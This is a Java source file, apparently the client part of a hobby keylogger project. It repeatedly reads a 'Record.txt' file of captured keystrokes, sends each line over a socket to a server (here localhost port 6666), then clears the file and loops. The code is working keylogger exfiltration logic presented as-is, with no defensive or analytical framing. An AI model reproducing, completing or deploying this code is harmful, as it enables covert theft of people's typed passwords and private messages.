package Client;
import java.io.*;
import java.net.Socket;
import java.text.FieldPosition;
import java.util.Scanner;


public class app extends Thread{
    String str;
    Socket s;
    DataOutputStream dos;
    // DataInputStream in;
    
    Scanner sc;
    
    public void run(){
        s = null;
        try{
            s = new Socket("localhost",6666);
            System.out.println("Connected to Server!");
            System.out.println(s.getLocalAddress() + ":" + s.getLocalPort() + ":" + s.getPort());
        }
        catch(Exception e){
            System.out.println(e);
        }



        try{
            dos = new DataOutputStream(s.getOutputStream());
            sc = new Scanner(new File("D:\\arcsh\\Documents\\GitHub\\Keylogger\\Record.txt"));
            // in = new DataInputStream(new FileInputStream( new File("D:\\arcsh\\Documents\\GitHub\\Keylogger\\Record.txt")));
            while (true) {
                
        try{
        str = sc.nextLine();}
        catch(Exception e){
            FileWriter fw = new FileWriter(new File("D:\\arcsh\\Documents\\GitHub\\Keylogger\\Record.txt"));
            fw.close();
            this.sleep(5000);
            sc = new Scanner(new File("D:\\arcsh\\Documents\\GitHub\\Keylogger\\Record.txt"));
            continue;
        }
        // byte[] data = str.getBytes();
        // System.out.println(in.r);
        
        dos.writeUTF(str);
        System.out.println("data written!");
        this.sleep(1000);
        
    }
        // s.close();
        }
        catch(Exception e){
            System.out.println(e);
            
        }
        


    }

    public static void main(String[] args) {
        app ap = new app();
        ap.start();
    }
}

